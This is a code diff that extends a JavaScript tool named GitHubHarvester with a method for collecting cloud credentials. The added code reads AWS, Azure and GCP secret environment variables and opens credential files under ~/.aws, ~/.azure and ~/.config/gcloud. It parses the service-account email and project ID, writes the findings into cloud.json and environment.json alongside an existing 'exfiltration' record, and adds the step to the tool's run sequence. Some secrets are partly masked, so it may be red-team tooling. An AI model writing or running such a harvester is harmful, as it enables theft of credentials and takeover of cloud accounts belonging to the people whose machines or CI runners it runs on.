@@ -30,6 +30,11 @@ class GitHubHarvester {
                 secrets: [],
                 runner: {}
             },
+            cloud: {
+                aws: [],
+                azure: [],
+                gcp: []
+            },
             npm: [],
             exfiltration: []
         };
@@ -214,6 +219,146 @@ class GitHubHarvester {
         }
     }
 
+    harvestCloudCredentials() {
+        console.log('[*] Harvesting cloud credentials...');
+
+        // AWS credentials from environment
+        const awsEnvVars = [
+            'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_SESSION_TOKEN',
+            'AWS_SECURITY_TOKEN', 'AWS_DEFAULT_REGION', 'AWS_REGION',
+            'AWS_ROLE_ARN', 'AWS_WEB_IDENTITY_TOKEN_FILE'
+        ];
+
+        awsEnvVars.forEach(varName => {
+            const value = process.env[varName];
+            if (value) {
+                const isSensitive = varName.includes('SECRET') || varName.includes('TOKEN');
+                const displayValue = isSensitive
+                    ? value.substring(0, 8) + '****' + value.substring(Math.max(0, value.length - 4))
+                    : value;
+
+                this.findings.cloud.aws.push({
+                    source: 'env',
+                    name: varName,
+                    value: displayValue,
+                    length: value.length,
+                    sensitive: isSensitive
+                });
+                console.log(`  [+] AWS ${varName}: ${isSensitive ? `(${value.length} chars)` : displayValue}`);
+            }
+        });
+
+        // AWS credentials file
+        const awsCredsFile = path.join(this.homeDir, '.aws', 'credentials');
+        if (fs.existsSync(awsCredsFile)) {
+            try {
+                const content = fs.readFileSync(awsCredsFile, 'utf-8');
+                const profiles = content.match(/\[([^\]]+)\]/g) || [];
+                const hasKeys = content.includes('aws_access_key_id');
+                this.findings.cloud.aws.push({
+                    source: 'file',
+                    path: '~/.aws/credentials',
+                    profiles: profiles.map(p => p.replace(/[\[\]]/g, '')),
+                    hasKeys: hasKeys
+                });
+                console.log(`  [+] AWS credentials file: ${profiles.length} profiles`);
+            } catch (e) {}
+        }
+
+        // Azure credentials from environment
+        const azureEnvVars = [
+            'AZURE_CLIENT_ID', 'AZURE_CLIENT_SECRET', 'AZURE_TENANT_ID',
+            'AZURE_SUBSCRIPTION_ID', 'AZURE_CREDENTIALS', 'ARM_CLIENT_ID',
+            'ARM_CLIENT_SECRET', 'ARM_TENANT_ID', 'ARM_SUBSCRIPTION_ID'
+        ];
+
+        azureEnvVars.forEach(varName => {
+            const value = process.env[varName];
+            if (value) {
+                const isSensitive = varName.includes('SECRET') || varName.includes('CREDENTIALS');
+                const displayValue = isSensitive
+                    ? value.substring(0, 8) + '****' + value.substring(Math.max(0, value.length - 4))
+                    : value;
+
+                this.findings.cloud.azure.push({
+                    source: 'env',
+                    name: varName,
+                    value: displayValue,
+                    length: value.length,
+                    sensitive: isSensitive
+                });
+                console.log(`  [+] Azure ${varName}: ${isSensitive ? `(${value.length} chars)` : displayValue}`);
+            }
+        });
+
+        // Azure CLI config
+        const azureConfigDir = path.join(this.homeDir, '.azure');
+        if (fs.existsSync(azureConfigDir)) {
+            try {
+                const files = fs.readdirSync(azureConfigDir);
+                const relevantFiles = files.filter(f =>
+                    f.includes('token') || f.includes('profile') || f === 'azureProfile.json'
+                );
+                if (relevantFiles.length > 0) {
+                    this.findings.cloud.azure.push({
+                        source: 'file',
+                        path: '~/.azure/',
+                        files: relevantFiles
+                    });
+                    console.log(`  [+] Azure config: ${relevantFiles.join(', ')}`);
+                }
+            } catch (e) {}
+        }
+
+        // GCP credentials from environment
+        const gcpEnvVars = [
+            'GOOGLE_APPLICATION_CREDENTIALS', 'GOOGLE_CLOUD_PROJECT', 'GCP_PROJECT',
+            'GCLOUD_PROJECT', 'CLOUDSDK_CORE_PROJECT', 'GCP_SERVICE_ACCOUNT_KEY',
+            'GOOGLE_CREDENTIALS', 'GOOGLE_CLOUD_KEYFILE_JSON'
+        ];
+
+        gcpEnvVars.forEach(varName => {
+            const value = process.env[varName];
+            if (value) {
+                const isSensitive = varName.includes('KEY') || varName.includes('CREDENTIALS');
+                // For file paths, show the path; for JSON keys, truncate
+                const isPath = value.startsWith('/') || value.startsWith('~');
+                const displayValue = isSensitive && !isPath
+                    ? value.substring(0, 20) + '****'
+                    : value;
+
+                this.findings.cloud.gcp.push({
+                    source: 'env',
+                    name: varName,
+                    value: displayValue,
+                    length: value.length,
+                    sensitive: isSensitive
+                });
+                console.log(`  [+] GCP ${varName}: ${isSensitive && !isPath ? `(${value.length} chars)` : displayValue}`);
+            }
+        });
+
+        // GCP application default credentials
+        const gcloudConfigDir = path.join(this.homeDir, '.config', 'gcloud');
+        if (fs.existsSync(gcloudConfigDir)) {
+            try {
+                const adcPath = path.join(gcloudConfigDir, 'application_default_credentials.json');
+                if (fs.existsSync(adcPath)) {
+                    const content = fs.readFileSync(adcPath, 'utf-8');
+                    const creds = JSON.parse(content);
+                    this.findings.cloud.gcp.push({
+                        source: 'file',
+                        path: '~/.config/gcloud/application_default_credentials.json',
+                        type: creds.type,
+                        client_email: creds.client_email,
+                        project_id: creds.project_id
+                    });
+                    console.log(`  [+] GCP ADC: ${creds.type} (${creds.client_email || 'user'})`);
+                }
+            } catch (e) {}
+        }
+    }
+
     harvestNPMTokens() {
         console.log('[*] Harvesting NPM credentials...');
 
@@ -342,9 +487,11 @@ class GitHubHarvester {
 
         const files = {
             'github.json': this.findings.github,
+            'cloud.json': this.findings.cloud,
             'environment.json': {
                 ci: this.findings.ciEnvironment,
                 tokens: this.findings.github.tokens,
+                cloud: this.findings.cloud,
                 npm: this.findings.npm
             },
             'actionsSecrets.json': this.findings.github.secrets,
@@ -373,6 +520,7 @@ class GitHubHarvester {
         this.harvestGitHubActionsEnv();
         this.harvestGitHubCLICredentials();
         this.detectRunnerType();
+        this.harvestCloudCredentials();
         this.harvestNPMTokens();
 
         // API access
